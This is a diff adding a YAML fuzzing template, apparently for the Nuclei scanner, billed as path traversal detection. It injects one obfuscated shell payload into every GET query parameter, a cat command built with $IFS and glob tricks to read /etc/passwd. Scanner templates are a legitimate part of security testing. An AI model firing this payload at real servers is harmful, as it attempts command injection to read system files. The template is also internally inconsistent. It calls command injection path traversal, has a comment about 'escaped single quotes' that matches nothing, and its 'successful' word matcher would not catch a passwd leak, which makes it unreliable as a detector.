@@ -1,0 +1,36 @@
+id: fuzz-ptrav-custom
+
+info:
+  name: Custom Path Traversal Detection
+  author: netbaan
+  severity: medium  # Severity level adjusted for path traversal
+  description: |
+    This template is designed to detect path traversal vulnerabilities using a specific payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      ptrav:
+        - "cat$IFS$9\${PWD%%[a-z]*}e*c\${PWD%%[a-z]*}p?ss??"  # Escaped single quotes
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{ptrav}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successful"  # Typically the response would indicate a successful traversal
+
+      - type: status
+        status:
+          - 200  # Check for a success status code
